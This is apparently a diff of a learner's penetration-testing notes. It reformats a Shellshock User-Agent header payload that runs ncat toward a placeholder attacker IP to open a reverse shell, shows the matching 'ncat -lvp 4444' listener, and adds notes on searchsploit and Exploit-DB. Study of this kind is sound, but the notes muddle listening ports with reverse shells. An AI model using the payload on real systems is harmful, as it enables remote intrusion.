@@ -377,13 +377,30 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 - We can also use this to open a listening port using the ncat command from the victim machine. This is also called opening a reverse shell script. 
 
-```
-User-Agent: () { :;}; /bin/bash -c 'ncat <ip address>'
-```
+
+- `User-Agent: () { :;}; /bin/bash -c 'ncat <ip address>'`
+
 
 - But before this command can be run, a listening port must be open on the host
 
 - `ncat -lvp 4444`
+
+
+**Search Sploit**
+
+- `Exploit-DB`
+- It relies on a database called Exploit-Db
+- Exploit-Db is a built-in repository inside Kali-Linux that contains information regarding the publically disclosed exploits based on their `common vulnerability exposure identifier (CVE)`
+
+- `searchsploit` in kali linux queries this database. Kali linux or the searchsploit by typing `searchsploit -u`. This is important because it gives you the ability to run it offline
+
+- 
+
+
+
+
+
+
 
 
 - **Metasploit COmmands**
